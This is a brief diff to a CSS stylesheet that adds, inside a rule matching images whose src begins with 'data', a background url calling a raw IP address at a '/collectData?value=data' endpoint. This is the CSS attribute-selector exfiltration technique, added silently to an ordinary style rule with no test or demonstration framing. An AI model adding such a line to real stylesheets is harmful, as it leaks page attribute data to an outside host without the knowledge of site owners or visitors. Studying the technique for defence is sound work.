@@ -5,4 +5,5 @@ body
 
 img[src^="data"] {
      border: 5px solid green;
+	background: url("http://116.204.30.123/collectData?value=data;")
 }
